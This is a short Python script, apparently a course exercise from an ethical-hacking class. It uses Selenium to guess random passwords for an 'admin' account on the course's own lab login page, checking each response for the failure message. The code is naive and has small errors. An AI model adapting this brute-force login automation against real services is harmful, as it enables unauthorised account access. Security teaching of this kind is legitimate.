from bs4 import BeautifulSoup
url = 'https://cir.di.ionio.gr/undergrad/AppliedPython/ethicalHacking/index_1.html'
page = requests.get(url)
soup = BeautifulSoup(page.content)
print(soup)

# Bruteforce to find password
import requests
from selenium import webdriver
import string
import random
from bs4 import BeautifulSoup
import time

url = 'https://cir.di.ionio.gr/undergrad/AppliedPython/ethicalHacking/index_1.html'
page = requests.get(url)
# Create a BeautifulSoup object from the response
driver = webdriver.Firefox('geckodriver/')
all_ascii = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation

for i in range(3):
    time.sleep(20)
    driver.get(url)
    # Create a random string
    bruteforce_pass = ran = ''.join(random.choices(all_ascii, k = 10))
    print("Testing password ", bruteforce_pass)

    # Set Credentials
    driver.find_element_by_id("username").send_keys("admin")
    driver.find_element_by_id("password").send_keys(bruteforce_pass)
    driver.find_element_by_xpath("/html/body/section/form/ul/li[3]/input[2]").click()

    log_url = driver.current_url
    log_page = requests.get(log_url)
    soup = BeautifulSoup(log_page.content)
    if "User not found, or credentials incorrect - you're not logged-in" not in str(soup.prettify):
        break

print("Congrats")
